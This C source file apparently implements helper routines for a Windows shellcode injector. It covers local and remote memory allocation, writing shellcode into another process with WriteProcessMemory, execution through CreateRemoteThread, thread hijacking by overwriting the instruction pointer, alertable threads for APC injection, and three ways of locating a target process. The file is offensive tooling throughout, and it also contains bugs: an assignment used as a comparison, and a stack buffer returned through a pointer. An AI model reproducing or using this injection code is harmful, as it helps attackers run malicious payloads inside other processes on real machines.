#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>
#include <Psapi.h>

#include "Common.h"
#include "Structs.h"

BOOL ReportErrorWinAPI(char* ApiName)
{
	printf("[!] \"%s\" WinAPI Failed with Error : %d\n", ApiName, GetLastError());

	return FALSE;
}

BOOL ReportErrorNTAPI(char* ApiName, NTSTATUS STATUS)
{
	printf("[!] \"%s\" NTAPI Failed with Error : 0x%0.8X\n", ApiName, STATUS);

	return FALSE;
}

BOOL ConvertToLowerCase(IN LPCWSTR lpszInput, OUT LPWSTR* pOutput)
{
	WCHAR LowerName[MAX_PATH * 2];
	SIZE_T Size;
	int i;

	Size = lstrlenW(lpszInput);
	RtlSecureZeroMemory(LowerName, Size);
	if (Size < MAX_PATH * 2)
	{
		for (i = 0; i < Size; i++)
			LowerName[i] = (WCHAR) tolower(lpszInput[i]);
		LowerName[i++] = '\0';
	}

	*pOutput = LowerName;

	return TRUE;
}

BOOL AllocateMemory(IN HANDLE hProcess, IN PVOID pShellcode, IN SIZE_T sShellcodeSize, OUT PVOID* pShellcodeAddr)
{
	DWORD oldProtect;

	// Local allocation
	if (hProcess == NULL)
	{
		if ((*pShellcodeAddr = VirtualAlloc(NULL, sShellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) == NULL)
			return ReportErrorWinAPI("VirtualAlloc");
		memcpy(*pShellcodeAddr, pShellcode, sShellcodeSize);
		memset(pShellcode, '\0', sShellcodeSize);
		if (!VirtualProtect(*pShellcodeAddr, sShellcodeSize, PAGE_EXECUTE_READ, &oldProtect))
			return ReportErrorWinAPI("VirtualProtect");
	}

	// Remote allocation
	else
	{
		SIZE_T bytesWritten;

		if ((*pShellcodeAddr = VirtualAllocEx(hProcess, NULL, sShellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) == NULL)
			return ReportErrorWinAPI("VirtualAllocEx");
		if (!WriteProcessMemory(hProcess, *pShellcodeAddr, pShellcode, sShellcodeSize, &bytesWritten))
			return ReportErrorWinAPI("WriteProcessMemory");
		memset(pShellcode, '\0', sShellcodeSize);
		if (!VirtualProtectEx(hProcess, *pShellcodeAddr, sShellcodeSize, PAGE_EXECUTE_READ, &oldProtect))
			return ReportErrorWinAPI("VirtualProtectEx");
	}

	printf("[i] Allocated memory for shellcode at 0x%p\n", *pShellcodeAddr);

	return TRUE;
}

BOOL RunThread(IN HANDLE hProcess, IN BOOL bSuspended, IN PVOID pShellcode, OUT HANDLE* hThread, OUT DWORD* dwThreadId)
{
	// Local thread
	if (hProcess == NULL)
	{
		if (bSuspended)
			*hThread = CreateThread(NULL, NULL, pShellcode, NULL, CREATE_SUSPENDED, dwThreadId);
		else
			*hThread = CreateThread(NULL, NULL, pShellcode, NULL, NULL, dwThreadId);

		if (*hThread == NULL)
			return ReportErrorWinAPI("CreateThread");
	}

	// Remote thread
	else
	{
		if (bSuspended)
			*hThread = CreateRemoteThread(hProcess, NULL, NULL, pShellcode, NULL, CREATE_SUSPENDED, dwThreadId);
		else
			*hThread = CreateRemoteThread(hProcess, NULL, NULL, pShellcode, NULL, NULL, dwThreadId);

		if (*hThread == NULL)
			return ReportErrorWinAPI("CreateRemoteThread");
	}

	printf("[i] Created thread with thread ID %d\n", *dwThreadId);
	return TRUE;
}

BOOL WaitForThread(IN HANDLE hThread)
{
	printf("[i] Waiting infinitely for the thread to finish...\n");
	if (WaitForSingleObject(hThread, INFINITE) == WAIT_FAILED)
		return ReportErrorWinAPI("WaitForSingleObject");

	return TRUE;
}

BOOL FreeMemory(IN HANDLE hProcess, IN PVOID pShellcode)
{
	if (hProcess != NULL)
	{
		VirtualFreeEx(hProcess, pShellcode, 0, MEM_RELEASE);
		CloseHandle(hProcess);
	}
	else
		VirtualFree(pShellcode, 0, MEM_RELEASE);

	return TRUE;
}

BOOL ObtainProcessHandle(IN DWORD Method, IN LPCSTR lpProcessName, OUT HANDLE* hProcess, OUT DWORD* dwProcessId)
{
	if (Method == NULL)
		Method = SNAPSHOT;

	// Using CreateToolhelp32Snapshot WinAPI
	if (Method == SNAPSHOT)
	{
		HANDLE hSnapshot;
		PROCESSENTRY32 ProcEntry = { .dwSize = sizeof(PROCESSENTRY32) };
		WCHAR wszProcessName[MAX_PATH * 2];
		LPWSTR lpszLowerExeFile;

		if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL)) == INVALID_HANDLE_VALUE)
			return ReportErrorWinAPI("CreateToolhelp32Snapshot");

		if (!Process32First(hSnapshot, &ProcEntry))
			return ReportErrorWinAPI("Process32First");

		// Convert to WCHAR (Unicode)
		MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, lpProcessName, -1, wszProcessName, MAX_PATH * 2);

		do
		{
			ConvertToLowerCase(ProcEntry.szExeFile, &lpszLowerExeFile);

			// Found the target process
			if (wcscmp(wszProcessName, lpszLowerExeFile) == 0)
			{
				*dwProcessId = ProcEntry.th32ProcessID;
				if ((*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *dwProcessId)) == NULL)
					return ReportErrorWinAPI("OpenProcess");
				wprintf(L"[i] Obtained handle to process %s with PID %d\n", wszProcessName, *dwProcessId);
				CloseHandle(hSnapshot);
				return TRUE;
			}
		} while (Process32Next(hSnapshot, &ProcEntry));

		CloseHandle(hSnapshot);
	}

	// Using EnumProcesses WinAPI
	else if (Method == ENUMPROCESSES)
	{
		DWORD Processes[MAX_PROCESSES], dwBytesReturned, dwNumberOfProcesses;

		if (!EnumProcesses(Processes, sizeof(Processes), &dwBytesReturned))
			return ReportErrorWinAPI("EnumProcesses");

		dwNumberOfProcesses = dwBytesReturned / sizeof(DWORD);
		for (int i = 0; i < dwNumberOfProcesses; i++)
		{
			if (Processes[i] != 0)
			{
				HANDLE hTmpProcess;
				HMODULE hModule;
				DWORD cbNeeded;
				WCHAR wszEnumeratedProcessName[MAX_PATH * 2], wszOriginalProcessName[MAX_PATH * 2];
				LPWSTR LowerProcessName;

				if ((hTmpProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, Processes[i])) != NULL)
				{
					if (EnumProcessModules(hTmpProcess, &hModule, sizeof(hModule), &cbNeeded))
						if (GetModuleBaseName(hTmpProcess, hModule, wszEnumeratedProcessName, sizeof(wszEnumeratedProcessName) / sizeof(TCHAR)))
						{

							// Convert the enumerated process name to lowercase
							ConvertToLowerCase(wszEnumeratedProcessName, &LowerProcessName);
							// Convert the supplied process name to WCHAR (because the enumerated process name is WCHAR)
							MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, lpProcessName, -1, wszOriginalProcessName, MAX_PATH * 2);
							if (wcscmp(wszEnumeratedProcessName, wszOriginalProcessName) == 0)
							{
								*dwProcessId = Processes[i];
								if ((*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *dwProcessId)) == NULL)
									return ReportErrorWinAPI("OpenProcess 2");
								wprintf(L"[i] Obtained handle to process %s with PID %d\n", wszEnumeratedProcessName, *dwProcessId);
								CloseHandle(hTmpProcess);
								return TRUE;
							}
						}
				}
			}
		}
	}

	// Using NtQuerySystemInformation NativeAPI
	else if (Method = NTQUERYSYSTEMINFORMATION)
	{
		PSYSTEM_PROCESS_INFORMATION SystemProcInfo = NULL;
		ULONG uSystemProcInfoLen, uReturnLen;
		NTSTATUS STATUS;
		PVOID pValueToFree;
		fnNtQuerySystemInformation pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

		// Call NtQuerySystemInformation once to get the length of the array
		if ((STATUS = pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uSystemProcInfoLen)) != 0xC0000004)
			return ReportErrorNTAPI("NtQuerySystemInformation 1", STATUS);
		// Allocate the memory required to hold the array
		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uSystemProcInfoLen);
		// Call it again to get the array
		if ((STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uSystemProcInfoLen, &uReturnLen)) != 0x0)
			return ReportErrorNTAPI("NtQuerySystemInformation 2", STATUS);

		pValueToFree = SystemProcInfo;
		if (SystemProcInfo != NULL)
		{
			while (TRUE)
			{
				if (SystemProcInfo->ImageName.Length)
				{
					WCHAR wszOriginalProcessName[MAX_PATH * 2];
					LPWSTR lpEnumeratedLowerProcessName;

					MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, lpProcessName, -1, wszOriginalProcessName, MAX_PATH * 2);
					ConvertToLowerCase(SystemProcInfo->ImageName.Buffer, &lpEnumeratedLowerProcessName);
					if (wcscmp(lpEnumeratedLowerProcessName, wszOriginalProcessName) == 0)
					{
						*dwProcessId = SystemProcInfo->UniqueProcessId;
						if ((*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *dwProcessId)) == NULL)
							return ReportErrorWinAPI("OpenProcess");
						wprintf(L"[i] Obtained handle to process %s with PID %d\n", lpEnumeratedLowerProcessName, *dwProcessId);
						HeapFree(GetProcessHeap(), 0, pValueToFree);
						return TRUE;
					}
				}

				if (SystemProcInfo->NextEntryOffset == 0)
				{
					HeapFree(GetProcessHeap(), 0, pValueToFree);
					printf("[!] Could not locate the %s process\n", lpProcessName);
					return FALSE;
				}

				SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
			}
		}

		else
			printf("[!] SystemProcInfo wasn't populated with the process information\n");

		return FALSE;

	}
	
	// Wrong enumeration method
	else
	{
		printf("[!] Unknown enumeration method : %d\n", Method);
		return FALSE;
	}


	printf("[!] Failed to obtain handle to %s\n", lpProcessName);

	return FALSE;
}

BOOL ObtainThreadHandle(IN DWORD dwProcessId, IN DWORD dwMainThreadId, OUT HANDLE* hThread, OUT DWORD* dwThreadId)
{
	HANDLE hSnapshot = NULL;
	THREADENTRY32 Thr = { .dwSize = sizeof(THREADENTRY32) };

	if (dwProcessId == NULL)
		dwProcessId = GetCurrentProcessId();
	
	if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL)) == INVALID_HANDLE_VALUE)
		return ReportErrorWinAPI("CreateToolhelp32Snapshot");

	if (!Thread32First(hSnapshot, &Thr))
		return ReportErrorWinAPI("Thread32First");

	do
	{
		if (Thr.th32OwnerProcessID == dwProcessId && Thr.th32ThreadID != dwMainThreadId)
		{
			*dwThreadId = Thr.th32ThreadID;
			if ((*hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, *dwThreadId)) == NULL)
				return ReportErrorWinAPI("OpenThread");

			printf("[i] Obtained handle to thread with ID %d in process with ID %d\n", *dwThreadId, dwProcessId);
			CloseHandle(hSnapshot);
			return TRUE;
		}
	} while (Thread32Next(hSnapshot, &Thr));

	printf("[!] Failed to obtain handle to a thread!\n");
	CloseHandle(hSnapshot);

	return FALSE;
}

BOOL HijackThread(IN HANDLE hThread, IN PVOID pShellcodeAddr)
{
	CONTEXT Thr = { .ContextFlags = CONTEXT_CONTROL };

	if (hThread == NULL)
		return FALSE;

	if (SuspendThread(hThread) == (DWORD) - 1)
		return ReportErrorWinAPI("SuspendThread");

	if (!GetThreadContext(hThread, &Thr))
		return ReportErrorWinAPI("GetThreadContext");

	Thr.Rip = pShellcodeAddr;

	if (!SetThreadContext(hThread, &Thr))
		return ReportErrorWinAPI("SetThreadContext");
	printf("[i] Hijacked the thread\n");

	if (ResumeThread(hThread) == (DWORD)-1)
		return ReportErrorWinAPI("ResumeThread");

	CloseHandle(hThread);
	
	return TRUE;
}

BOOL CreateAlertableThread(IN HANDLE hProcess, IN DWORD dwAlertableFunction, OUT HANDLE* hThread, OUT DWORD* dwThreadId)
{
	PVOID pAlertableFunction;
	HANDLE hTmpThread;
	DWORD dwTmpThreadId;

	switch (dwAlertableFunction)
	{
	case SLEEPEX:
		pAlertableFunction = &AlertableSleepEx;
		break;

	case WAITFORSINGLEOBJECTEX:
		pAlertableFunction = &AlertableWaitForSingleObjectEx;
		break;

	case WAITFORMULTIPLEOBJECTSEX:
		pAlertableFunction = &AlertableWaitForMultipleObjectsEx;
		break;

	case MSGWAITFORMULTIPLEOBJECTSEX:
		pAlertableFunction = &AlertableMsgWaitForMultipleObjectsEx;
		break;

	case SIGNALOBJECTANDWAIT:
		pAlertableFunction = &AlertableSignalObjectAndWait;
		break;

	default:
		pAlertableFunction = &AlertableSleepEx;
	}

	if (!RunThread(hProcess, FALSE, pAlertableFunction, &hTmpThread, &dwTmpThreadId))
		return FALSE;

	*hThread = hTmpThread;
	*dwThreadId = dwTmpThreadId;

	return TRUE;
}

BOOL RunProcess(IN DWORD dwCreationFlag, IN LPCSTR lpProcessName, OUT HANDLE* hProcess, OUT HANDLE* hThread, OUT DWORD* dwProcessId)
{
	PROCESS_INFORMATION Pi = { 0 };
	STARTUPINFO Si = { 0 };
	char ProcessPath[MAX_PATH * 4];
	char winDir[MAX_PATH * 2];

	Si.cb = sizeof(STARTUPINFO);

	if (!GetEnvironmentVariableA("WINDIR", winDir, MAX_PATH * 2))
		return ReportErrorWinAPI("GetEnvironmentVariableA");
	sprintf_s(ProcessPath, MAX_PATH * 4, "%s\\System32\\%s", winDir, lpProcessName);

	printf("[i] Creating process %s\n", ProcessPath);
	if (!CreateProcessA(
		NULL,
		ProcessPath,
		NULL,
		NULL,
		FALSE,
		dwCreationFlag,
		NULL,
		NULL,
		&Si,
		&Pi
	))
		return ReportErrorWinAPI("CreateProcess");

	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;
	*dwProcessId = Pi.dwProcessId;

	return TRUE;
}